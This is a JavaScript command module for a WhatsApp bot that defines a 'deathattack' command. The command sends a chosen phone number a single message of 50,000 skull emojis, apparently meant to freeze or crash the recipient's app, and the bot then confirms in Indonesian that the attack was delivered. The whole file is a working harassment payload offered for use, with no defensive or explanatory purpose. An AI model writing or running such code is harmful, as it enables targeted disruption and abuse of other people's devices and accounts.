module.exports = {
  name: 'deathattack',
  execute: async (client, message, args) => {
    const target = args[0];
    if (!target) {
      return message.reply('👑 Format: .deathattack [target]');
    }

    const deathPayload = '💀'.repeat(50000) + '☠️ DEATH ATTACK SUPREME.';
    await client.sendMessage(target + '@s.whatsapp.net', { text: deathPayload });

    return message.reply(`👑 Death Attack Supreme berhasil dikirim ke ${target}.`);
  }
};
